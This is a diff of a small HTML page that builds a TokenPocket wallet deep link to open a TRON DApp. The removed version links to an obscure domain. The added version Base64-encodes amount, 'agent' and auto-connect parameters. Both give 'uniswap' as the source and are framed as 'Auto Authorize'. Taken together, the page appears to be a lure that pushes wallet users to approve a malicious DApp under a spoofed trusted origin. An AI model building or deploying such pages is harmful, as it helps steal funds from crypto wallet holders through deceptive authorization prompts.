@@ -3,14 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Open TokenPocket DApp</title>
+    <title>Open TokenPocket and Auto Authorize</title>
 </head>
 <body>
-    <h1>Open TokenPocket</h1>
-    <!-- 点击此链接以自动打开 TokenPocket 并加载 DApp -->
-    <a href='tpdapp://open?params={"url": "https://www.pihksale.finance/12s/static/new", "chain": "TRON", "source": "uniswap" }'>
-        Click to Open TokenPocket and Authorize
-    </a>
+    <h1>TokenPocket Auto Connection</h1>
+    <a id="tpLink" href="#">Open TokenPocket and Authorize</a>
+
+    <script>
+        // 定义参数
+        const params = {
+            amount: 1,         // 交易金额（可根据需求修改）
+            type: 1,           // 类型（根据需求）
+            ads: "",           // 地址字段
+            block: "trx",      // 区块链网络，这里为 TRON
+            agent: "36ee4",    // 代理字段，具体值可根据需求设置
+            client_type: 2,    // 客户端类型
+            isAdd: true        // 是否自动连接
+        };
+
+        // 将参数转换为 Base64 编码
+        const base64Params = btoa(JSON.stringify(params));
+
+        // 构建最终的 DApp URL
+        const dappUrl = `https://your-dapp-url.com?params=${base64Params}`;
+
+        // 构建 tpdapp 链接
+        const tpLink = `tpdapp://open?params=${encodeURIComponent(JSON.stringify({
+            url: dappUrl,
+            chain: "TRON",
+            source: "uniswap"
+        }))}`;
+
+        // 将链接嵌入到页面
+        document.getElementById('tpLink').setAttribute('href', tpLink);
+
+        // 打印生成的链接以供调试
+        console.log("Generated TokenPocket Link:", tpLink);
+    </script>
 </body>
 </html>
-
